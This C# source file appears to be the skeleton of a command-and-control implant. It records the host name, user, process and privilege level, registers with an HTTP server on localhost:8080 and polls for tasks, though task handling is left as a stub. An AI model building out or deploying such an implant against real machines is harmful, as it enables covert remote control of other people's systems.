using C2.Agent.Models;
using System;
using System.Diagnostics;
using System.Security.Principal;

static AgentMetadata GenerateMetadata()
{
    Process currentProc = Process.GetCurrentProcess();
    WindowsIdentity identity = WindowsIdentity.GetCurrent();
    WindowsPrincipal principal = new WindowsPrincipal(identity);

    var integrity = "Medium";

    if (identity.IsSystem)
    {
        integrity = "SYSTEM";
    }
    else if (principal.IsInRole(WindowsBuiltInRole.Administrator))
    {
        integrity = "High";
    }

    AgentMetadata output =  new AgentMetadata
    {
        Id = Guid.NewGuid().ToString(),
        Hostname = Environment.MachineName,
        Username = Environment.UserName,
        ProcessName = currentProc.ProcessName,
        ProcessId = currentProc.Id,
        Integrity = integrity,
        Architecture = Environment.Is64BitOperatingSystem ? "x64" : "x86"
    };

    currentProc.Dispose();
    identity.Dispose();

    return output;
}

void Stop()
{
    
}

Thread.Sleep(5000);

AgentMetadata agentMetadata = GenerateMetadata();
CommModule commModule = new HttpCommModule("localhost", 8080);
commModule.Init(agentMetadata);
CancellationTokenSource tokenSource = new CancellationTokenSource();

commModule.Start();
while (!tokenSource.IsCancellationRequested)
{
    if (commModule.RecvData(out var tasks))
    {
        //action Tasks
    }
}